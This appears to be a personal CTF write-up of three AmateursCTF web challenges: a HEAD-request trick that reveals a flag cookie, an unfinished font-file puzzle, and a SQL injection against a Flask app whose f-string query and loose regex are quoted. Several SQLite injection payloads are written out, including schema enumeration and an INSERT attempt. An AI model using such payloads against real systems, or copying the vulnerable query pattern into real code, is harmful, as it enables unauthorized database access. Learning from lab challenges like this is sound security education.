## web/denied
- problem
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/4ce1ae31-5215-4b63-a718-291dfc484dc5)
- on reaching the endpoint
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/12e69d4e-1bdd-425f-9f81-c5c5c2a66ed1)
- the given code
```
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

```
- so we must not use get method
- copied the curl request and made a post
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/3758a32d-8118-4002-baf0-3b2d75bebeda)
- the post method is not available
- so we see what options do we have
- we see get,head
- now from this https://reqbin.com/req/c-tmyvmbgu/curl-head-request-example
- we do send a head request
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/b8d0bda9-d3c4-4e25-a028-30c5a6b8e025)
```
C:\home\radha> curl http://denied.amt.rs/ -I     
HTTP/1.1 200 OK
Content-Length: 7
Content-Type: text/html; charset=utf-8
Date: Sat, 06 Apr 2024 05:37:48 GMT
Etag: W/"7-skdQAtrqJAsgWjDuibJaiRXqV44"
Server: Caddy
Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
X-Powered-By: Express
```
- we got a cookie
- use url decoder
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/c1be76e1-43d2-4bc7-843b-90b6261f8924)
- we get the flag`amateursCTF{s0_m@ny_0ptions...}`
## web/agile-rut --not completed
- problem
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/c962a307-98b8-4f64-a8a4-e8964e8c45b2)
- the endpoint
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/1afebdb7-57e2-433e-9f85-aada7e3d7793)
- otf file  OpenType font format.
- https://docs.fileformat.com/font/otf/
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/eb110157-b1d8-4fe1-a052-8261aadd37ce)
```
C:\home\radha\Downloads\amertus_ctf\web\agile_rut> head *
OTTO
� CFF Ϋ�p�[GSUBЄ��d�rOS/2px
Qxcmap9�x��4head*Rv��6hhea���$hmtxo��maxphname��D}p-post� ت��_<�3{�3{���+���RhPh��������1�XXXX@  =��R����  "�)5'
�
```
- so type,name descripton
```
uint32	sfntVersion	0x00010000 or 0x4F54544F (‘OTTO’)
```
## web/one-shot
- problem
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/3504a4c4-81b4-4a62-b96c-c056218cced4)
- sqlite3 https://www.digitalocean.com/community/tutorials/how-to-use-the-sqlite3-module-in-python-3
- in memory sqlite3 https://www.sqlite.org/inmemorydb.html
- support for concurrency https://stackoverflow.com/questions/393554/python-sqlite3-and-concurrency
- https://www.geeksforgeeks.org/python-re-search-vs-re-match/
```
import re
a=input("give id")
while(a!=0):
    if not re.match("[1234567890abcdef]{3}", a):
        print("invalid id")
    else:
        print("valid")
    a=input("give id")
```
- there is a issue with regular expression it is re.match
- so if we give exaclty 16 valid chars followed by anything it just accepts
```
@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."

```
- so here id is user contolled
- i dont see any default tables with table_* in sqlite3
- we need to see what happens` searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]` when table does not exist
- `a%'union select 1/*` in /search gives internal servre err
- `a%'union select "1"/*`
- this does give output so there is sql injection
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/df4d2a1e-53de-4f99-b249-9683cca1866e)
- `a%';union select "1"/*` -internal sever er
- `a%'union select "1" from (DELETE FROM table_{id})/*` -500
- `a%'union select "1" from table_{id}/*` -500
- sqlite_schema
- https://www.sqlite.org/schematab.html
- `a%'union select name from sqlite_schema/*` this does give a lot of info
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ace9ce66-2470-4753-8f09-966567c1c3ac)
- a%'union select password from table_{id}/*
- INSERT INTO table (column1,column2 ,..) VALUES( value1,	value2 ,...)
- `SELECT name 
FROM (
    INSERT INTO mytable1 (col1, col2) 
    VALUES (val1, val2) 
    RETURNING name
) AS inserted_rows;
`
- a%'union select name from (INSERT INTO sqlite_schema(name) VALUES (1729) RETURNING name) /* 